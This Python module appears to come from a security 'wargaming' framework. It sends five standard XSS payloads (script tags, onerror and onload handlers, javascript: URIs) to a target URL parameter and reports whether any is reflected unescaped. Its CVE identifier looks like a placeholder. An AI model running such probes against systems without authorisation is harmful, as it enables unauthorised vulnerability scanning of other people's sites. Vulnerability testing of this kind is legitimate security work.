"""
XSS Exploit (CWE-79) - Cross-Site Scripting attack.

Tests for reflected and stored XSS vulnerabilities.

Author: MAXIMUS Wargaming Team
Date: 2025-10-11
"""

import asyncio
import httpx
import time
from typing import Dict

from exploit_database import ExploitResult, ExploitStatus, ExploitCategory


# Exploit Metadata
EXPLOIT_ID = "cwe_79_xss"
NAME = "XSS - Reflected & Stored"
DESCRIPTION = "Tests for Cross-Site Scripting via script injection and event handlers"
CATEGORY = "xss"
CWE_IDS = ["CWE-79"]
CVE_EXAMPLES = ["CVE-2024-XSS-001"]


async def execute(
    target_url: str,
    timeout: int = 30,
    **kwargs
) -> ExploitResult:
    """
    Execute XSS exploit.
    
    Args:
        target_url: Target application URL
        timeout: Max execution time
        **kwargs: Additional parameters
    
    Returns:
        ExploitResult with success=True if XSS worked
    """
    start_time = time.time()
    output_lines = []
    
    try:
        # XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        ]
        
        param_name = kwargs.get("param_name", "q")
        
        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as client:
            for payload in payloads:
                output_lines.append(f"Testing XSS payload: {payload[:40]}...")
                
                params = {param_name: payload}
                
                try:
                    response = await client.get(target_url, params=params)
                    
                    # Check if payload reflected in response (unescaped)
                    if payload in response.text:
                        duration = time.time() - start_time
                        output_lines.append(f"✓ XSS vulnerability confirmed: payload reflected unescaped")
                        
                        return ExploitResult(
                            exploit_id=EXPLOIT_ID,
                            category=ExploitCategory(CATEGORY),
                            status=ExploitStatus.SUCCESS,
                            success=True,
                            output="\n".join(output_lines),
                            error=None,
                            duration_seconds=duration,
                            metadata={"payload": payload, "target_url": target_url}
                        )
                    
                    output_lines.append(f"  Payload not reflected or escaped")
                    
                except httpx.HTTPError as e:
                    output_lines.append(f"  HTTP error: {e}")
        
        # No XSS detected
        duration = time.time() - start_time
        output_lines.append("✗ No XSS vulnerability detected (likely patched)")
        
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory(CATEGORY),
            status=ExploitStatus.FAILED,
            success=False,
            output="\n".join(output_lines),
            error=None,
            duration_seconds=duration,
            metadata={"target_url": target_url}
        )
        
    except asyncio.TimeoutError:
        duration = time.time() - start_time
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory(CATEGORY),
            status=ExploitStatus.TIMEOUT,
            success=False,
            output="\n".join(output_lines),
            error="Exploit execution timeout",
            duration_seconds=duration,
            metadata={"target_url": target_url}
        )
    
    except Exception as e:
        duration = time.time() - start_time
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory(CATEGORY),
            status=ExploitStatus.ERROR,
            success=False,
            output="\n".join(output_lines),
            error=str(e),
            duration_seconds=duration,
            metadata={"target_url": target_url}
        )
